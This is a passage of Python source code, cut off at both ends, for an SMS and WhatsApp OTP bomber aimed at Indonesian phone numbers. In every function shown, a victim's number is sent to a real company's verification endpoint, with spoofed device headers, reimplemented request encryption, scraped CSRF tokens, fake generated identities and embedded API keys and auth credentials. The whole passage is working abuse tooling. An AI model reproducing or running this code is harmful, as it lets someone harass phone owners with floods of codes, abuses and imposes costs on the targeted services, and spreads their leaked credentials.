            except:
                return False
        return False

    except Exception as e:
        return False


def spam_otp_uangme(nomor):
    try:
        aid = f'gaid_15497a9b-2669-42cf-ad10-{spam_otp_codex(12)}'
        url = f'https://api.uangme.com/api/v2/sms_code?phone={nomor}&scene_type=login&send_type=wp'
        headers = {'aid': aid, 'android_id': 'b787045b140c631f', 'app_version': '300504', 'brand': 'samsung', 'carrier': '00', 'Content-Type': 'application/x-www-form-urlencoded', 'country': '510', 'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0', 'fcm_reg_id': 'frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo', 'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0', 'lan': 'in_ID', 'model': 'SM-G965N', 'ns': 'wifi', 'os': '1', 'timestamp': '1732178536', 'tz': 'Asia%2FBangkok', 'User-Agent': 'okhttp/3.12.1', **{'v': '1', 'version': '28'}}
        res = requests.get(url, headers=headers, timeout=10)
    except:
        return False

def spam_otp_seva(nomor):
    try:
        import json
        import time
        import hashlib
        import base64
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        from Crypto.Random import get_random_bytes
        
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+'):
            nomor = '+62' + nomor

        def cryptojs_encrypt(data, key):
            salt = get_random_bytes(8)
            key_bytes = key.encode()

            def derive_key_iv(password, salt):
                d = b''
                d_i = b''
                while len(d) < 48:
                    d_i = hashlib.md5(d_i + password + salt).digest()
                    d += d_i
                return (d[:32], d[32:48])
            
            key_derived, iv = derive_key_iv(key_bytes, salt)
            cipher = AES.new(key_derived, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
            return base64.b64encode(b'Salted__' + salt + encrypted).decode()
        
        SECRET = 'c2ea90e6b78d9e29f3b9824e5b6bf2e84931f876f1660bf3b4c87c5a938d86d5'
        TS = str(int(time.time() * 1000))
        payload = {'phoneNumber': nomor}
        body = cryptojs_encrypt(json.dumps(payload), SECRET)
        sig_data = TS + ';' + json.dumps(payload)
        signature = cryptojs_encrypt(json.dumps(sig_data), SECRET)
        
        session = requests.Session()
        
        headers = {
            'accept': 'application/json',
            'content-type': 'text/plain',
            'x-signature': signature,
            'origin': 'https://www.seva.id',
            'referer': 'https://www.seva.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
        
        resp = session.post('https://api.seva.id/auth/otp/whatsapp', 
                           data=body, 
                           headers=headers, 
                           timeout=10)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('success'):
                    return True
                return False
            except:
                return True if resp.status_code == 200 else False
        else:
            return False
                
    except Exception as e:
        return False

def spam_otp_uatas(nomor):
    try:
        import json
        import time
        import base64
        
        from Crypto.Cipher import AES
        
        from Crypto.Util.Padding import pad
        
        if nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        
        nomor = ''.join(filter(str.isdigit, nomor))
        if not nomor.startswith('0'):
            nomor = '0' + nomor

        def aes_encrypt(data, key, iv):
            key_bytes = key.encode('utf-8')
            cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
            return base64.b64encode(encrypted).decode()
        KEY = '5JkPzCacn1Qj9cAl'
        IV = bytes(16)
        TS = int(time.time() * 1000)
        params = {'mobile': nomor, 'time_stamp': TS}
        data = aes_encrypt(json.dumps(params), KEY, IV)
        session = requests.Session()
        resp = session.post('https://uatas.id/delapi/web/passport/sendphonecode', headers={'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://uatas.id', 'referer': 'https://uatas.id/h5/gml/', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'uid': '0', 'ticket': '0', 'sec_level': '2', 'package_name': 'uatas', 'm_id': '10', 'data': data, 'version': '1.0.0'}, timeout=10)
        
        return resp.status_code == 200
    except:
        return False

def spam_otp_topindowa(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        import uuid
        import time
        
        uuid_device = str(uuid.uuid4())
        
        url = 'https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request'
        
        headers = {
            'Host': 'mobileapps.topindoku.co.id',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?1',
            'uuid': uuid_device,
            'Origin': 'https://mitra.topindoku.co.id',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        payload = {
            "phone": phone,
            "via": "WA",
            "hash": "gruenbf12d2",
            "fbc": "",
            "fbp": "fb.2.1784860943418.959857478235602163",
            "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_kasirpintar(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        
        session = requests.Session()
        r1 = session.get('https://kasirpintar.co.id/registerpro', 
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            },
            timeout=10
        )
        csrf = re.search('name="_token" value="([^"]+)"', r1.text)
        if csrf:
            csrf = csrf.group(1)
            email = ''.join(random.choices(string.ascii_lowercase, k=10)) + str(int(time.time())) + '@gmail.com'
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'Origin': 'https://kasirpintar.co.id',
                'Referer': 'https://kasirpintar.co.id/registerpro',
                'X-CSRF-TOKEN': csrf,
                'X-Requested-With': 'XMLHttpRequest'
            }
            r2 = session.post('https://kasirpintar.co.id/checkEmail',
                headers=headers,
                data={
                    'email': email,
                    'no_hp': nomor,
                    'country_code': '+62',
                    'g_recaptcha_response': '',
                    '_token': csrf
                },
                timeout=10
            )
            token_otp = re.search('"token":"([^"]+)"', r2.text)
            if token_otp:
                token_otp = token_otp.group(1)
                r3 = session.post('https://kasirpintar.co.id/requestOTPWA',
                    headers=headers,
                    data={
                        'no_hp': nomor,
                        'email': email,
                        'token_wa': csrf,
                        'token': token_otp,
                        '_token': csrf
                    },
                    timeout=10
                )
                return r3.status_code < 400
            else:
                return False
        else:
            return False
    except:
        return False

def spam_otp_bigseller(nomor):
    try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        session = requests.Session()
        url = "https://www.bigseller.com/api_v2/api/v3/auth/sendRegPhoneCode.json"
        payload = {
            "phoneAccountNum": nomor_lokal,
            "phoneAccountCode": 62,
            "accessCode": "",
            "picVerificationCode": "",
            "ticketId": "tr03NJtP5mTD41cvhMEPRCghT45ergDNSopNa2N-ZQCdKSKRD-L=0oMy3nCnpFeXiigBvrd0Kcyb5wOmMg=rRJoSie1f3PDzS=HJtvgbYT=S71tux2JkJa4hCjoQH7eyGZvrIMxch=nQ4qY*",
            "randomStr": "@T2d"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://www.bigseller.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
        }
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False


def spam_otp_toyota(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""TOKEN=$(curl -s -X POST 'https://data-web.tam-icm.com/api/public/vendors/tokenize' -H 'Authorization: Basic ZGlkeDpUb3lvdGEyMDI0' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Origin: https://www.toyota.astra.co.id' -H 'Referer: https://www.toyota.astra.co.id/' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' -d '{{\"data\":[\"{phone}\"]}}' | jq -r '.[0].token') && curl -s -X POST 'https://data-web.tam-icm.com/api/public/vendors/register' -H 'Host: data-web.tam-icm.com' -H 'sec-ch-ua-platform: "Android"' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' -H 'Accept: application/json, text/plain, */*' -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' -H 'Content-Type: application/json' -H 'sec-ch-ua-mobile: ?1' -H 'Origin: https://www.toyota.astra.co.id' -H 'sec-fetch-site: cross-site' -H 'sec-fetch-mode: cors' -H 'sec-fetch-dest: empty' -H 'Referer: https://www.toyota.astra.co.id/' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' -d '{{\"phoneNumber\":\"$TOKEN\"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('message') and ('otp' in str(data.get('message')).lower() or 'success' in str(data.get('message')).lower()):
                    return True
                if data.get('statusCode') and '20000' in str(data.get('statusCode')):
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_ktakilat(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        url = 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode'
        
        payload = {
            'mobileNo': nomor_lokal,
            'smsType': 1
        }
        
        headers = {
            'Content-Type': 'application/json; charset=UTF-8',
            'Device-Info': 'eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
        }
        
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        return res.status_code == 200
        
    except Exception as e:
        return False
        
def spam_otp_bantusaku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        unique_code = str(uuid.uuid4())
        url = 'https://m.bantusaku.id/api/user/send-sms'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://m.bantusaku.id',
            'referer': 'https://m.bantusaku.id/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-auth-token': 'null',
            'x-device-os': 'web',
            'x-merchant': 'BantuSaku',
            'x-token-sign': unique_code,
            'x-version': 'web-3.2.1'
        }
        
        payload = {
            'phone': nomor_lokal,
            'type': 'register',
            'imageCode': '',
            'merchantNo': 'BantuSaku',
            'uniquCode': unique_code
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_bisatopup(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        dev = spam_otp_codex(16)
        url = f'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id={dev}&version_name=6.12.04&version=61204'
        
        payload = f'phone_number={nomor_lokal}'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        res = requests.post(url, data=payload, headers=headers, timeout=10)
        return res.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_speedcash_wa(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        url_token = 'https://sofia.bmsecure.id/central-api/oauth/token'
        headers_token = {
            'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        res_tok = requests.post(url_token, data='grant_type=client_credentials', headers=headers_token, timeout=10)
        token = spam_otp_nilai(res_tok.text, 'access_token":"', '","')
        
        if token:
            uuid = spam_otp_codex(8)
            url_otp = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate'
            payload = {
                'version_name': '6.2.1 (428)',
                'phone': nomor_lokal,
                'appid': 'SPEEDCASH',
                'version_code': 428,
                'location': '0,0',
                'state': 'REGISTER',
                'type': 'WA',
                'app_id': 'SPEEDCASH',
                'uuid': f'00000000-4c22-250d-ffff-ffff{uuid}',
                'via': 'BB ANDROID'
            }
            headers_otp = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            res = requests.post(url_otp, json=payload, headers=headers_otp, timeout=10)
            return res.status_code == 200
        else:
            return False
            
    except Exception as e:
        return False

def spam_otp_sicepat(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        apikey = '67b98547-6cf7-4f05-9c1b-be597fca892f'
        url = f'https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/{nomor_lokal}?sms=true'
        
        headers = {
            'Host': 'api.sicepatconsumer.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'x-api-key': apikey,
            'Origin': 'https://dashboard.sicepat.com',
            'Referer': 'https://dashboard.sicepat.com/',
            'sec-ch-ua-platform': 'Android'
        }
        
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_iskconmumbai(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://www.iskconmumbai.com/api/send_otp'
        
        headers = {
            'Host': 'www.iskconmumbai.com',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'Referer': 'https://www.iskconmumbai.com/web/signup',
            'Cookie': 'frontend_lang=en_US; session_id=a06efb92ff6b53383e6136b42413bc5cc1af2fc0'
        }
        
        payload = {
            'id': 7,
            'jsonrpc': '2.0',
            'method': 'call',
            'params': {
                'signup': True,
                'mobile': nomor_lokal
            }
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_jogjakita(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        auth_resp = session.post('https://aci-user.bmsecure.id/oauth/token', data={'grant_type': 'client_credentials', 'uuid': '00000000-0000-0000-0000-000000000000', 'id_user': '0', 'id_kota': '0', 'location': '0.0,0.0', 'via': 'jogjakita_user', 'version_code': '501', 'version_name': '6.10.1'}, headers={'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'okhttp/4.10.0'}, timeout=10)
        token = auth_resp.json().get('access_token')
        if token:
            resp = session.post('https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send', json={'phone_user': nomor, 'primary_credential': {'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0, 'location': '0.0,0.0', 'uuid': '', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, 'uuid': '00000000-4c22-250d-3006-9a465f072739', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, headers={'Content-Type': 'application/json; charset=UTF-8', 'Authorization': f'Bearer {token}'}, timeout=10)
            result = resp.json()
        else:
            return False
    except:
        return False


def spam_otp_yogyaonline(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        session.get('https://www.yogyaonline.co.id/register', 
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )
        
        url = 'https://www.yogyaonline.co.id/api/v1/send-otp'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.yogyaonline.co.id',
            'referer': 'https://www.yogyaonline.co.id/register',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        payload = {'phone_number': nomor_lokal}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_bantusaku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        unique_code = str(uuid.uuid4())
        url = 'https://m.bantusaku.id/api/user/send-sms'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://m.bantusaku.id',
            'referer': 'https://m.bantusaku.id/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-auth-token': 'null',
            'x-device-os': 'web',
            'x-merchant': 'BantuSaku',
            'x-token-sign': unique_code,
            'x-version': 'web-3.2.1'
        }
        
        payload = {
            'phone': nomor_lokal,
            'type': 'register',
            'imageCode': '',
            'merchantNo': 'BantuSaku',
            'uniquCode': unique_code
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_mengantar(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f'{random.choice(first)} {random.choice(last)}'
        email = f"{nama.lower().replace(' ', '')}{random.randint(10, 99)}@gmail.com"

        session = requests.Session()
        url = 'https://app.mengantar.com/api/auth/send-verification-code'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://app.mengantar.com',
            'referer': 'https://app.mengantar.com/id/register',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        
        payload = {
            'courier': 'JNE',
            'email': email,
            'language': 'id',
            'name': nama,
            'phone': nomor_lokal,
            'subject': 'register',
            'verificationType': 'whatsapp'
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_volta(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://voltaindonesia.com', 'referer': 'https://voltaindonesia.com/', 'sec-ch-ua': '\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://auth-production.voltaindonesia.com/v1/client/request-otp', json={'phoneNumber': nomor}, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_pluang(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor_lokal = '+' + nomor
        elif nomor.startswith('+62'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '+62' + nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f'{random.choice(first)} {random.choice(last)}'
        email = f"{nama.lower().replace(' ', '')}{random.randint(10, 99)}@gmail.com"
        device_id = f"web-{str(uuid.uuid4())}"
        request_id = str(uuid.uuid4())

        session = requests.Session()
        url = 'https://api-pluang.pluang.com/api/v3/user/signup/phone'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://trade.pluang.com',
            'referer': 'https://trade.pluang.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-device-id': device_id,
            'x-language-code': 'id',
            'x-platform': 'desktop-web',
            'x-request-id': request_id
        }
        
        payload = {
            'name': nama,
            'email': email,
            'phone': nomor_lokal,
            'messageMedium': 'WHATSAPP_MESSAGE',
            'referral': '',
            'signature': '107216cfe6d1023ceeb94a5c63f498f6a126160345d4ad9b375daef34371ebfe'
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_youtap(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://bos-api.youtap.id/v1/graphql'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://bos.youtap.id',
            'referer': 'https://bos.youtap.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-content-type-options': 'nosniff',
            'x-platform-id': 'WEB',
            'x-timezone': 'Asia/Jakarta',
            'x-village-id': '7ceec169-6e16-11ec-a41a-9383440169c7'
        }
        
        # Step 1: Check phone
        payload1 = {
            'variables': {
                'checkPhoneInput': {
                    'phone': nomor_lokal,
                    'platformType': 'BOS_REGISTRATION'
                }
            },
            'query': 'mutation ($checkPhoneInput: CheckPhoneInput!) {\n checkPhone(checkPhoneInput: $checkPhoneInput) {\n merchantRegistration {\n id\n phone\n platformType\n otpExpiredAt\n }\n token\n }\n}'
        }
        
